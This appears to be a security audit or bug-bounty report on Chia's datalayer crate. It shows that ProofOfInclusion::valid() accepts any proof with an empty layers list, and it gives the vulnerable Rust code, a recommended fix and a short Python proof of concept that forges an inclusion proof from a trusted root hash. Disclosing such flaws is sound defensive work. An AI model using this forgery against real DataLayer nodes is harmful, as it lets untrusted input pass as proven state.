### Title
Vacuous `ProofOfInclusion::valid()` Accepts Any Forged Proof With Empty `layers` — (`File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` contains a loop over `self.layers` and a final equality check. When `layers` is empty, the loop is silently skipped and the final check `existing_hash == self.root_hash()` reduces to `self.node_hash == self.node_hash`, which is unconditionally `true`. This means any `ProofOfInclusion` with an empty `layers` vector passes `valid()` regardless of what `node_hash` contains — a direct structural analog to the Rubicon route-length bug.

### Finding Description

`ProofOfInclusion::valid()` is implemented as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()
}
``` [1](#0-0) 

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash   // ← falls back to node_hash when layers is empty
    }
}
``` [2](#0-1) 

When `layers = []`:
1. The `for layer in &self.layers` loop body never executes (zero iterations).
2. `existing_hash` stays equal to `self.node_hash`.
3. `self.root_hash()` returns `self.node_hash` (the `else` branch).
4. The final check becomes `self.node_hash == self.node_hash` → always `true`.

Therefore `valid()` returns `true` for **any** `ProofOfInclusion { node_hash: X, layers: [] }`, for any arbitrary `X`.

`ProofOfInclusion` is `Streamable` (deserializable from bytes) and fully exposed through Python bindings with `from_bytes`, `from_py_object`, and a public `valid()` method: [3](#0-2) [4](#0-3) 

An attacker who knows the trusted root hash `R` of a multi-node tree constructs:

```python
forged = ProofOfInclusion(node_hash=R, layers=[])
assert forged.valid()          # True — loop skipped, vacuous check
assert forged.root_hash() == R # True — root_hash() returns node_hash
```

Both the internal consistency check (`valid()`) and the root-hash comparison (`root_hash() == trusted_root`) pass simultaneously, with no cryptographic work required.

### Impact Explanation

A receiver that validates a `ProofOfInclusion` by calling `proof.valid()` and comparing `proof.root_hash()` against a trusted root will accept the forged proof. The attacker proves that the trusted root hash `R` is itself a leaf in the tree — which is false for any multi-node tree. Any DataLayer logic that makes an inclusion/exclusion decision based solely on these two checks (without separately verifying that `node_hash` is the hash of the claimed key-value pair) will accept invalid state as proven. This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion or lets untrusted input prove invalid state**.

### Likelihood Explanation

The `ProofOfInclusion` struct is `Streamable` and exposed over the Python boundary. Any code path that receives a proof from an untrusted peer and calls only `proof.valid()` (plus an optional `root_hash()` comparison) is vulnerable. The fuzz target and internal tests already demonstrate the pattern of calling `proof.valid()` without a separate leaf-hash verification step: [5](#0-4) 

The `ProofOfInclusion` struct is also constructible directly from Python via `from_bytes` or the `__new__` constructor, making attacker-controlled input trivially reachable.

### Recommendation

`valid()` must be given a trusted external root hash to compare against, rather than deriving the root from the proof itself. The corrected signature should be:

```rust
pub fn valid(&self, trusted_root: &Hash) -> bool {
    // ... existing loop ...
    existing_hash == *trusted_root
}
```

Alternatively, add an explicit guard rejecting empty `layers` when the tree is known to have more than one node, or require callers to always call `root_hash()` and compare it against an externally-anchored root before trusting `valid()`.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, MerkleBlob
from chia_rs import KeyId, ValueId

# Build a real two-node tree
blob = MerkleBlob(bytearray())
blob.insert(KeyId(1), ValueId(10), b'\x01'*32)
blob.insert(KeyId(2), ValueId(20), b'\x80'*32)
blob.calculate_lazy_hashes()
trusted_root = blob.get_root()

# Forge a proof with empty layers — no cryptographic work needed
forged = ProofOfInclusion(node_hash=trusted_root, layers=[])

assert forged.valid()                      # True — vacuous check
assert forged.root_hash() == trusted_root  # True — root_hash() == node_hash
# Caller is deceived: the tree root is "proven" to be a leaf
```

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L13-29)
```rust
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}

#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** crates/chia-datalayer/fuzz/fuzz_targets/proofs_of_inclusion.rs (L28-31)
```rust
    for key in keys {
        let proof = blob.get_proof_of_inclusion(key).unwrap();
        assert!(proof.valid());
    }
```
